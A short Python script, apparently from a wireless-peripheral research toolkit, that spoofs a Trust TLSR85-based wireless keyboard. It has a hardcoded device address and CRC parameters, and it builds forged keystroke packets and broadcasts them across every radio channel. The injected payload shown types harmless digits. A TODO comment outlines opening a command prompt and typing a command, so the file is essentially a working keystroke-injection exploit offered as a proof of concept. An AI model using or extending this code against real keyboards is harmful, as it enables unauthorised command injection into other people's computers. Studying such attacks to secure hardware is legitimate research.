#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Dummy keylogger for the Trust keyboard, also detects Trust mouse but doesn't parse it yet
# Address of keyboard and mouse are hardcoded

import time

from binascii import unhexlify
from lib import common
from devices.TLSR85.tlsr85 import Tlsr85
from devices.TLSR85.tlsr85_keyboard import *


common.init_args('./tlsr85-spoofing.py')
common.parse_and_init()

trust_keyboard = Tlsr85Keyboard("4a:b4:cb", "80", 22, 0x11021, 0x24bf, 2)
# base address for poss : "d5:54:cb"
# crc init for poss: 0xcb01


channels = Tlsr85.CHANNELS
channel_index = 0
# Need to set channel to prevent USBError (somehow)
common.radio.set_channel(channels[channel_index])
rate = Tlsr85.RATE

# TODO put preamble in tlsr85
preamble =b"\xAA\xAA\xB5"

# TODO try to open terminal and send command ls ("win", delay 1s, "c", "m", "d", delay 1s, "enter", delay 2s "l", "s")


attack = [
    trust_keyboard.build_packet([Tlsr85KeyboardScancode.NUM_1]),
    trust_keyboard.build_packet([Tlsr85KeyboardScancode.NUM_2]),
    trust_keyboard.build_packet([Tlsr85KeyboardScancode.NUM_3]),
    trust_keyboard.build_packet([Tlsr85KeyboardScancode.NUM_0]),
    trust_keyboard.build_packet([Tlsr85KeyboardScancode.NUM_5])
    ]

# send payload
common.radio.enter_promiscuous_mode_generic(unhexlify(trust_keyboard.base_address.replace(':', '')), rate=common.RF_RATE_2M)
for payload in attack:
    for i in range(len(channels)):
        common.radio.set_channel(channels[i])
        for _ in range(20):
            common.radio.transmit_payload_generic(payload=preamble + payload, address=unhexlify(trust_keyboard.base_address.replace(':', '')))
            time.sleep(0.0001)